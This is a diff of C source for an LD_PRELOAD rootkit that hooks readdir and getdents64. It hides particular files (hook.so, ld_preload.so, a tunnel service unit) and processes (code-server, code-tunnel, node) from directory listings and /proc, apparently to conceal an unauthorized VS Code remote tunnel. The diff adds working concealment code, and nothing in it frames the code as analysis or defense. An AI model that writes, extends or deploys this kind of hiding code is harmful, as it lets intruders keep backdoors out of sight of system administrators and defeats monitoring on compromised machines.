@@ -7,11 +7,17 @@
 #include <stdlib.h>
 #include <unistd.h>
 #include <fcntl.h>
+#include <sys/syscall.h>
 #include <sys/stat.h>
-
-static const char *HIDE_FILES[] = {"vscode", ".vscode", "hook.so", "pid.txt", "code-tunnel.service", "ld_preload.so"};
-static const char *HIDE_PROCS[] = {"code-server", "vscode", "code-tunnel", "node"};
-
+struct linux_dirent64 {
+    unsigned long long d_ino;
+    long long          d_off;
+    unsigned short     d_reclen;
+    unsigned char      d_type;
+    char               d_name[];
+};
+static const char *HIDE_FILES[] = {"vscode", ".vscode", "hook.so", "vscode.so", "pid.txt", "code-tunnel.service", "ld_preload.so"};
+static const char *HIDE_PROCS[] = {"code-server", "vscode", "code-tunnel", "node", "code"};
 static int is_proc_dir(int fd) {
     char path[256];
     char link[256];
@@ -23,7 +29,6 @@ static int is_proc_dir(int fd) {
     }
     return 0;
 }
-
 static int should_hide(const char *name, const char **list, size_t count) {
     if (!name) return 0;
     for (size_t i = 0; i < count; i++) {
@@ -33,81 +38,63 @@ static int should_hide(const char *name, const char **list, size_t count) {
     }
     return 0;
 }
-
 static int check_process_name(const char *pid_str) {
-    int pid = atoi(pid_str);
-    if (pid <= 0) return 0;
-
     char comm_path[256];
     snprintf(comm_path, sizeof(comm_path), "/proc/%s/comm", pid_str);
     
     int fd = open(comm_path, O_RDONLY);
     if (fd == -1) return 0;
-
     char proc_name[256];
     ssize_t n = read(fd, proc_name, sizeof(proc_name)-1);
     close(fd);
-
     if (n > 0) {
         proc_name[n] = '\0';
-        // Remove trailing newline if present
         char *nl = strchr(proc_name, '\n');
         if (nl) *nl = '\0';
-
         return should_hide(proc_name, HIDE_PROCS, sizeof(HIDE_PROCS)/sizeof(HIDE_PROCS[0]));
     }
     return 0;
 }
-
+// Hook readdir
 typedef struct dirent *(*orig_readdir_f)(DIR *);
 static orig_readdir_f real_readdir = NULL;
-
 struct dirent *readdir(DIR *dir) {
-    if (!real_readdir)
-        real_readdir = (orig_readdir_f)dlsym(RTLD_NEXT, "readdir");
-
+    if (!real_readdir) real_readdir = (orig_readdir_f)dlsym(RTLD_NEXT, "readdir");
     struct dirent *entry;
     int fd = dirfd(dir);
     int is_proc = is_proc_dir(fd);
-
     while ((entry = real_readdir(dir)) != NULL) {
-        // Hide files/folders based on name
-        if (should_hide(entry->d_name, HIDE_FILES, sizeof(HIDE_FILES)/sizeof(HIDE_FILES[0])))
-            continue;
-
-        // If we are in /proc, check if the PID corresponds to a hidden process
-        if (is_proc && entry->d_type == DT_DIR) {
-            if (check_process_name(entry->d_name))
-                continue;
-        }
-
+        if (should_hide(entry->d_name, HIDE_FILES, sizeof(HIDE_FILES)/sizeof(HIDE_FILES[0]))) continue;
+        if (is_proc && entry->d_type == DT_DIR && check_process_name(entry->d_name)) continue;
         return entry;
     }
     return NULL;
 }
-
-typedef struct dirent64 *(*orig_readdir64_f)(DIR *);
-static orig_readdir64_f real_readdir64 = NULL;
-
-struct dirent64 *readdir64(DIR *dir) {
-    if (!real_readdir64)
-        real_readdir64 = (orig_readdir64_f)dlsym(RTLD_NEXT, "readdir64");
-
-    struct dirent64 *entry;
-    int fd = dirfd(dir);
+// Hook getdents64 (This is what ps/ls usually uses)
+typedef int (*orig_getdents64_f)(unsigned int, struct linux_dirent64 *, unsigned int);
+static orig_getdents64_f real_getdents64 = NULL;
+int getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count) {
+    if (!real_getdents64) real_getdents64 = (orig_getdents64_f)dlsym(RTLD_NEXT, "getdents64");
+    
+    int nread = real_getdents64(fd, dirp, count);
+    if (nread <= 0) return nread;
     int is_proc = is_proc_dir(fd);
-
-    while ((entry = real_readdir64(dir)) != NULL) {
-        if (should_hide(entry->d_name, HIDE_FILES, sizeof(HIDE_FILES)/sizeof(HIDE_FILES[0])))
-            continue;
-
-        if (is_proc && entry->d_type == DT_DIR) {
-            if (check_process_name(entry->d_name))
-                continue;
+    int bpos = 0;
+    while (bpos < nread) {
+        struct linux_dirent64 *d = (struct linux_dirent64 *)((char *)dirp + bpos);
+        int hide = 0;
+        if (should_hide(d->d_name, HIDE_FILES, sizeof(HIDE_FILES)/sizeof(HIDE_FILES[0]))) {
+            hide = 1;
+        } else if (is_proc && d->d_type == DT_DIR && check_process_name(d->d_name)) {
+            hide = 1;
         }
-
-        return entry;
+        if (hide) {
+            int reclen = d->d_reclen;
+            memmove(d, (char *)d + reclen, nread - bpos - reclen);
+            nread -= reclen;
+        } else {
+            bpos += d->d_reclen;
+        }
     }
-    return NULL;
+    return nread;
 }
-
